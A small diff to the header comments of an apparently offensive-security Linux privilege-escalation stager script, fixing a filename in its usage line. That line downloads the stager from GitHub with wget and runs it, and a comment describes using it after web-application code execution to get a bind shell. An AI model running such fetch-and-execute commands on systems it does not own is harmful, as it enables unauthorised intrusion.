@@ -1,5 +1,5 @@
 # used to stage all appropriate tools needed for privesc + handles some base config setup
-# use: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh && chmod +x linux_stager && ./linux_stager.sh 
+# use: wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linux_stager.sh && chmod +x linux_stager.sh && ./linux_stager.sh 
 # (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
 
 
